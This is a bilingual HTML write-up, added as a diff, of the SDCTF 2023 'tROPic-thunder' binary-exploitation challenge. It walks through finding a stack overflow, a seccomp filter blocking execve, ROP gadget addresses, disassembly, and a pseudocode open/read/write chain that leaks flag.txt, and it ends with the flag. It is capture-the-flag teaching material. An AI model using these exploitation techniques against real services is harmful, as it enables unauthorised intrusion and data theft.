@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>tROPic-thunder (250) (SDCTF 2023) Writeup</title>
+<script src="../../../../common/common.js"></script>
+<style>
+table.gadget-table {
+	border: 1px solid black;
+}
+table.gadget-table th, table.gadget-table td {
+	border: 1px solid black;
+	padding: 0.2em 0.4em;
+}
+table.gadget-table td {
+	font-family: monospace;
+}
+</style>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>tROPic-thunder (250)</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+TCPサーバの接続情報と、ファイル <code>Dockerfile</code> および <code>tROPic-thunder</code> が与えられた。
+</p>
+<p>
+<common-tool data-lang="ja">Ghidra</common-tool> で <code>tROPic-thunder</code> を逆コンパイルすると、以下の <code>main</code> 関数が出てきた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+Information for connection to a TCP server, and files <code>Dockerfile</code> and <code>tROPic-thunder</code> were given.
+</p>
+<p>
+I decompiled the file <code>tROPic-thunder</code> using <common-tool data-lang="en">Ghidra</common-tool>. As a result, I found this function <code>main</code>.
+</p>
+</div>
+<p><a href="main.txt" data-extension="c" class="code-link">main.txt</a></p>
+
+<p class="language-selector-ja" lang="ja">
+この関数は、関数 <code>setup_seccomp()</code> を呼び出した後、<code>fgets</code> 関数でデータを読み込んでいる。<br>
+<code>setup_seccomp()</code> 関数は、以下の内容であった。
+</p>
+<p class="language-selector-en" lang="en">
+This function calls a function <code>setup_seccomp()</code>, and then reads data using the function <code>fgets</code>.<br>
+This is the function <code>setup_seccomp()</code>.
+</p>
+<p><a href="setup_seccomp.txt" data-extension="c" class="code-link">setup_seccomp.txt</a></p>
+
+<p class="language-selector-ja" lang="ja">
+このページ
+</p>
+<p class="language-selector-en" lang="en">
+Referring this page,
+</p>
+<p><a href="https://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html">seccomp_rule_add(3) - Linux manual page</a></p>
+<div class="language-selector-ja" lang="ja">
+<p>
+を参照すると、<code>seccomp_rule_add</code> の第3引数がシステムコールを、第2引数がそのシステムコールが使われた時のアクションを表すことがわかる。
+</p>
+<p>
+このページ
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+We can know that the 3rd argument of <code>seccomp_rule_add</code> specifies a system call, and that the 2nd one specifies an action to take when the system call is used.
+</p>
+<p>
+From this page,
+</p>
+</div>
+<p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64 · Ryan A. Chapman</a></p>
+<div class="language-selector-ja" lang="ja">
+<p>
+より、システムコール <code>0x3b (59)</code> は <code>sys_execve</code>、<code>0x142 (322)</code> は <code>stub_execveat</code> であることがわかる。
+</p>
+<p>
+さらに、このページ
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+We can know that a system call <code>0x3b (59)</code> corresponds to <code>sys_execve</code> and that <code>0x142 (322)</code> corresponds to <code>stub_execveat</code>.
+</p>
+<p>
+Also, this page
+</p>
+</div>
+<p><a href="https://github.com/seccomp/libseccomp/blob/main/include/seccomp.h.in">libseccomp/seccomp.h.in at main · seccomp/libseccomp · GitHub</a></p>
+<div class="language-selector-ja" lang="ja">
+<p>
+より、ここで指定されているアクション <code>0</code> は <code>SCMP_ACT_KILL</code> すなわち使用したスレッドが強制終了されることを表していることがわかる。<br>
+よって、<code>execve</code> を使わずにflagを得る方法を考えないといけなそうである。
+</p>
+<p>
+まず、他の問題より、サーバプログラムのカレントディレクトリにファイル <code>flag.txt</code> があると予想した。<br>
+さらに、逆アセンブル結果およびバイナリエディタを用いて、ファイル <code>tROPic-thunder</code> から以下のgadgetを見つけた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+Tells us that the action <code>0</code>, used here, corresponds to <code>SCMP_ACT_KILL</code>, which means that threads that called the system calls are terminated.<br>
+This suggests that we should come up with a way to obtain the flag without using <code>execve</code>.
+</p>
+<p>
+Firstly, considering other challenges, I guessed that there should be a file <code>flag.txt</code> in the working directory of the server program.<br>
+Then, using the disassembled code and a binary editor, I found these gadgets from the file <code>tROPic-thunder</code>.
+</p>
+</div>
+<table class="gadget-table">
+<tr>
+<th>
+<span class="language-selector-ja" lang="ja">アドレス</span>
+<span class="language-selector-en" lang="en">address</span>
+</th>
+<th>
+<span class="language-selector-ja" lang="ja">バイナリ</span>
+<span class="language-selector-en" lang="en">binary data</span>
+</th>
+<th>
+<span class="language-selector-ja" lang="ja">処理内容</span>
+<span class="language-selector-en" lang="en">what to do</span>
+</th>
+</tr>
+<tr><td>0x45ed9a</td><td>5e c3</td><td>pop %rsi; ret</td></tr>
+<tr><td>0x45b667</td><td>5f c3</td><td>pop %rdi; ret</td></tr>
+<tr><td>0x45b056</td><td>5a c3</td><td>pop %rdx; ret</td></tr>
+<tr><td>0x45899c</td><td>58 c3</td><td>pop %rax; ret</td></tr>
+<tr><td>0x403472</td><td>48 89 50 18 48 83 c4 08 c3</td><td>mov %rdx,0x18(%rax); add $0x8,%rsp; ret</td></tr>
+<tr><td>0x401ca7</td><td>48 83 c4 08 c3</td><td>add $0x8,%rsp; ret</td></tr>
+<tr><td>0x40968c</td><td>48 89 c7 ff d2</td><td>mov %rax,%rdi; callq *%rdx</td></tr>
+<tr><td>0x484105</td><td>0f 05 c3</td><td>syscall; ret</td></tr>
+</table>
+
+<p class="language-selector-ja" lang="ja">
+また、<code>.plt</code> セクションの最初と最後は、以下のようになっていた。
+</p>
+<p class="language-selector-en" lang="en">
+Also, this is the first and last part of the section <code>.plt</code>.
+</p>
+<code-block data-extension="txt">
+0000000000400418 &lt;.plt&gt;:
+  400418:	ff 25 fa 5b 2d 00    	jmpq   *0x2d5bfa(%rip)        # 6d6018 &lt;_GLOBAL_OFFSET_TABLE_+0x18&gt;
+  40041e:	66 90                	xchg   %ax,%ax
+  400420:	ff 25 fa 5b 2d 00    	jmpq   *0x2d5bfa(%rip)        # 6d6020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;
+  400426:	66 90                	xchg   %ax,%ax
+
+...
+
+  4004c0:	ff 25 fa 5b 2d 00    	jmpq   *0x2d5bfa(%rip)        # 6d60c0 &lt;_GLOBAL_OFFSET_TABLE_+0xc0&gt;
+  4004c6:	66 90                	xchg   %ax,%ax
+  4004c8:	ff 25 fa 5b 2d 00    	jmpq   *0x2d5bfa(%rip)        # 6d60c8 &lt;_GLOBAL_OFFSET_TABLE_+0xc8&gt;
+  4004ce:	66 90                	xchg   %ax,%ax
+</code-block>
+<div class="language-selector-ja" lang="ja">
+<p>
+ここで参照されている <code>0x6d6018</code> から <code>0x6d60d0</code> までの領域は書き込みが可能で、かつそれぞれの8バイトのうち最上位の1バイトには 0x00 が格納されていると予想した。
+</p>
+<p>
+さらに、<code>main</code> 関数の逆アセンブル結果は、以下のようになっていた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+I guessed that the region from <code>0x6d6018</code> to <code>0x6d60d0</code>, referred from here, can be written, and that the highest bytes of each 8 bytes are 0x00.
+</p>
+<p>
+Moreover, this is the disassembled code of the function <code>main</code>.
+</p>
+</div>
+<code-block data-extension="txt">
+0000000000400bf2 &lt;main&gt;:
+  400bf2:	55                   	push   %rbp
+  400bf3:	48 89 e5             	mov    %rsp,%rbp
+  400bf6:	48 83 ec 70          	sub    $0x70,%rsp
+  400bfa:	48 8b 05 e7 5b 2d 00 	mov    0x2d5be7(%rip),%rax        # 6d67e8 &lt;_IO_stdin&gt;
+  400c01:	be 00 00 00 00       	mov    $0x0,%esi
+  400c06:	48 89 c7             	mov    %rax,%rdi
+  400c09:	e8 f2 09 02 00       	callq  421600 &lt;setbuf&gt;
+  400c0e:	48 8b 05 cb 5b 2d 00 	mov    0x2d5bcb(%rip),%rax        # 6d67e0 &lt;_IO_stdout&gt;
+  400c15:	be 00 00 00 00       	mov    $0x0,%esi
+  400c1a:	48 89 c7             	mov    %rax,%rdi
+  400c1d:	e8 de 09 02 00       	callq  421600 &lt;setbuf&gt;
+  400c22:	48 8b 05 af 5b 2d 00 	mov    0x2d5baf(%rip),%rax        # 6d67d8 &lt;_IO_stderr&gt;
+  400c29:	be 00 00 00 00       	mov    $0x0,%esi
+  400c2e:	48 89 c7             	mov    %rax,%rdi
+  400c31:	e8 ca 09 02 00       	callq  421600 &lt;setbuf&gt;
+  400c36:	b8 00 00 00 00       	mov    $0x0,%eax
+  400c3b:	e8 2d ff ff ff       	callq  400b6d &lt;setup_seccomp&gt;
+  400c40:	48 8d 3d 61 0c 0a 00 	lea    0xa0c61(%rip),%rdi        # 4a18a8 &lt;_IO_stdin_used+0x8&gt;
+  400c47:	e8 c4 ec 01 00       	callq  41f910 &lt;_IO_puts&gt;
+  400c4c:	48 8b 15 95 5b 2d 00 	mov    0x2d5b95(%rip),%rdx        # 6d67e8 &lt;_IO_stdin&gt;
+  400c53:	48 8d 45 90          	lea    -0x70(%rbp),%rax
+  400c57:	be 00 02 00 00       	mov    $0x200,%esi
+  400c5c:	48 89 c7             	mov    %rax,%rdi
+  400c5f:	e8 9c e3 01 00       	callq  41f000 &lt;_IO_fgets&gt;
+  400c64:	b8 00 00 00 00       	mov    $0x0,%eax
+  400c69:	c9                   	leaveq 
+  400c6a:	c3                   	retq   
+  400c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+</code-block>
+
+<div class="language-selector-ja" lang="ja">
+<p>
+<code>fgets</code> が読み込んだデータを書き込み始める位置は <code>%rbp - 0x70</code> であり、リターンアドレスは <code>%rbp + 8</code> にあるので、最初に実行させるアドレスはデータの 0x78 バイト目から書き込めばいいことがわかる。
+</p>
+<p>
+見つけたgadgetを用い、ファイル <code>file.txt</code> の内容を標準出力に書き出す以下の処理を行うことにした。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+The address for <code>fgets</code> to store data read is <code>%rbp - 0x70</code> and one of the return address is <code>%rbp + 8</code>, so the first address to be executed should be written from the 0x78-th byte of the data.
+</p>
+<p>
+Using the gadgets, I decided to perform these operations to output the contents of the file <code>file.txt</code> to the standard output.
+</p>
+</div>
+<code-block data-extension="txt">
+buffer = 0x6d6018;
+buffer_size = 0x6d60d0 - 0x6d6018;
+fd = sys_open("flag.txt", O_RDONLY);
+sys_read(fd, buffer, buffer_size);
+sys_write(1, buffer, buffer_size);
+sys_exit(0);
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+以下が、これを実現するため実際に送る内容である。
+</p>
+<p class="language-selector-en" lang="en">
+This is what should actually be sent to achieve this.
+</p>
+<p><a href="payload.asm" data-collapse="true" class="code-link">payload.asm</a></p>
+
+<p class="language-selector-ja" lang="ja">
+<common-tool data-lang="ja">NASM</common-tool> でアセンブルすると、以下のデータが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+I assembled this with <common-tool data-lang="en">NASM</common-tool>. This is the result.
+</p>
+<p><a href="payload.bin" data-binary="true" class="code-link">payload.bin</a></p>
+
+<p class="language-selector-ja" lang="ja">
+このデータを <common-tool data-lang="ja">Tera Term</common-tool> の「ファイル送信」で送信すると、flagが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+I obtained the flag by sending this data using "Send File" on <common-tool data-lang="en">Tera Term</common-tool>.
+</p>
+
+<div class="flag">sdctf{I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">SDCTF 2023</a>
+</p>
+</body>
+</html>
